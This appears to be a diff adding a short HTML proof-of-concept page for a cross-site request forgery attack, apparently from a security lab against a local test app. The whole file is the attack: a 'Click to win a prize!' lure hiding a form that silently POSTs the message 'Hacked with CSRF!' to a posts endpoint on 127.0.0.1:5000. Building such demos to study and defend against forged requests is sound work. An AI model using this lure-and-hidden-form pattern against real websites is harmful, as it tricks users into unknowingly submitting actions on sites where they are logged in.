@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Attack</title>
+  </head>
+  <body>
+    <h2>Click to win a prize!</h2>
+    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+      <input type="hidden" name="message" value="Hacked with CSRF!" />
+      <button type="submit">Claim your prize!</button>
+    </form>
+  </body>
+</html>
